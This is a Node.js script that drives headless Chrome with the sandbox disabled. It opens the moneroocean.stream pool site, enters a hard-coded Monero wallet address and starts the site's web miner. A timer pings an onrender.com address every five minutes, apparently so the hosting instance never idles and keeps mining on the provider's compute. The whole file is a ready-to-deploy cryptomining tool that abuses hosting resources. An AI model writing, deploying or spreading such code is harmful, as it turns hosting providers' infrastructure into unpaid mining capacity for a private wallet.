var express = require('express');
var app = express();
var https = require("https");
var puppeteer = require("puppeteer-core");
//var puppeteer = require("puppeteer"); Only Debug Mode

const browserP = puppeteer.launch({
  executablePath: process.env.CHROME_BIN,
  args: [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage'
  ],
});

setInterval(() => {
  https.get("https://main-test-7.onrender.com", (res) => {
    console.log("Server is alive...");
  });
}, (1000 * 60) * 5); //5min periods

browserP.then((brw) => {
  brw.newPage().then((page) => {

      page.goto('https://moneroocean.stream/').then(() => {
        page.setBypassCSP(true);
          page.focus("#AddrField").then(() => {
            page.keyboard.type('84Pdo8ceYrk1cSJACjvAXr7DeaU3u2MzJ2WLBtbevnvoJ89iRewKnCGisRPCytHDWb3FoVEtTUaCgfBoAVkhFLcDH5Lg7uh').then(() => {
              page.keyboard.press('Enter').then(() => {
                page.waitForSelector('#WebMinerBtn', {visible: true}).then(() => {
                  page.$eval('#WebMinerBtn', form => form.click() ).then(() => {
                    console.log("Mining Başladı...")
                  })
                })
              })
            })
          })

          page.on('console', message => {
            page.$$('#WebMinerHash').then((span) => {
              span.pop().getProperty('innerText').then((obj) => {
                obj.jsonValue().then((hs) => {
                  console.log(message.text(), "Mining Power --> " + hs);
                })
              })
            })
          });
      });
  })
})

app.get('/', function(req, res, next) {
  console.log("Server starting...");
  res.json({ status: 'alive' });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`Listening on port ${PORT}`);
});
